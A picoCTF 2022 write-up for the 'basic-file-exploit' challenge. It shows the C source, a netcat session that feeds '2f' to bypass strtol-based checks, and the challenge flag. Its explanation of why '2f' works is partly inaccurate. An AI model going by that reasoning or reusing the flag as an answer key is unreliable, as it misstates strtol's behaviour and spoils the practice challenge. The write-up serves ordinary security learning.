## Name: basic-file-exploit
#### Points: 100
#### Description: The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! Connect to the program with netcat: $ nc saturn.picoctf.net 50366 The program's source code with the flag redacted can be downloaded here.
#### Files: `program-redacted.c`

We are given a netcat connection where we can choose to write or view data:

```console
â”Œâ”€â”€(gagrã‰¿desktop)-[/picoCTF2022/basic-file-exploit]
â””â”€$ nc saturn.picoctf.net 50366
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program

```

When entering a value, we also have to specify the length of our data, meaning the length that we want to print when echoing some entry.
If you tried to enter some nonsense into every type of input prompt, you might get lucky and find the flag right away, however, since I am creating a writeup, 
I should at least have some idea of what's going on ðŸ˜…

Looking into the provided source code, a certain if-statement looks very promising: 

```C
  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }
```
Okay, so we ned to make the entry number equal 0. I am not very familiar with C, so I had to look up the `strtol`-function. This particular function converts
a string representation of a number into a `long int` (aka, a number), with a given base (in this case, base 10 - which is the most common number system).
For example, `input: "200"`, `strtol(200, NULL, 10)` will convert the `"200"` to `200`.

However, if the given string cannot be converted to a number, `0` is returned! This is very useful to know, since we cannot enter the value `0`. We simply need to pass some
data that cannot be converted by this function.

The next problem is to figure our where exactly this needs to be passed. Again, looking at the code, we can identify the function which contains
the aforementioned if-statement. The only place where the flag is outputted is in the `data_read()` method. 

Looking for this method in the code, we can see that it is called in the following way:

```C
  puts("Hi, welcome to my echo chamber!");
  puts("Type '1' to enter a phrase into our database");
  puts("Type '2' to echo a phrase in our database");
  puts("Type '3' to exit the program");

  ...

    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");
    } else if (command == 1) {
      data_write();
      puts("Write successful, would you like to do anything else?");
    } else if (command == 2) {
      if (inputs == 0) {
        puts("No data yet");
        continue;
      }
      data_read();
      puts("Read successful, would you like to do anything else?");
    } else if (command == 3) {
      return 0;
    } else {
      puts("Please type either 1, 2 or 3");
      puts("Maybe breaking boundaries elsewhere will be helpful");
    }
  }

  return 0;
}
```

We are prompted to choose either 1, 2, or 3. The method is only called if we choose option 2, and if there exists some data. Therefore, we firstly need to 
use option 1 to pass some data:

```console
â”Œâ”€â”€(gagrã‰¿desktop)-[/mnt/â€¦/kali/pico/picoCTF2022/basic-file-exploit]
â””â”€$ nc saturn.picoctf.net 50366
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
aaa
aaa
Please enter the length of your data:
3
3
Your entry number is: 1
Write successful, would you like to do anything else?

```
The data that you enter here is not important, we only need data to be present in order use option 2.

After entering data, we are prompted `would you like to do anything else?`. This is where we perform the exploit. At this point, data is present, and we 
skip the `else if` check:

```C
else if (command == 2) {
      if (inputs == 0) {
        puts("No data yet");
        continue;
      }
      data_read();
```

Because of the way the `strtol` function works, we need to add a number at the beginning of the string, but we can append whatever value after. 
For example, when prompted if we want to do anything else, if we write `2f`, the convertion fails, and we are given the flag ðŸš©:

<details>
  <summary>Flag [SPOILER] </summary>
  
  
  ```console
        â”Œâ”€â”€(gagrã‰¿desktop)-[/picoCTF2022/basic-file-exploit]
        â””â”€$ nc saturn.picoctf.net 50366                                                                 
        Hi, welcome to my echo chamber!
        Type '1' to enter a phrase into our database
        Type '2' to echo a phrase in our database
        Type '3' to exit the program
        1
        1
        Please enter your data:
        aaa
        aaa
        Please enter the length of your data:
        3
        3
        Your entry number is: 1
        Write successful, would you like to do anything else?
        2f
        2f
        Please enter the entry number of your data:
        No data given.
        picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_25D6CDDB}
  ```
  
  
</details>







